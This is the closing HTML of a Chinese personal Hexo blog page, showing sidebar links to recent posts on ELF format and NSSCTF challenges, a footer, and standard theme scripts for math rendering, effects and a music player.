href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式"><img src="https://w.wallhaven.cc/full/d6/wallhaven-d6wdl3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ELF文件格式"/></a><div class="content"><a class="title" href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式">ELF文件格式</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/NSSCTF-babyof/" title="NSSCTF-babyof"><img src="https://w.wallhaven.cc/full/ex/wallhaven-exwgv8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NSSCTF-babyof"/></a><div class="content"><a class="title" href="/2023/07/24/NSSCTF-babyof/" title="NSSCTF-babyof">NSSCTF-babyof</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/NSSCTF-whitegive_pwn/" title="NSSCTF-whitegive_pwn"><img src="https://w.wallhaven.cc/full/rr/wallhaven-rrjvyq.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NSSCTF-whitegive_pwn"/></a><div class="content"><a class="title" href="/2023/07/24/NSSCTF-whitegive_pwn/" title="NSSCTF-whitegive_pwn">NSSCTF-whitegive_pwn</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 主元</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container').forEach(node => {
            if (node.hasAttribute('display')) {
              btf.wrap(node, 'div', { class: 'mathjax-overflow' })
            } else {
              btf.wrap(node, 'span', { class: 'mathjax-overflow' })
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>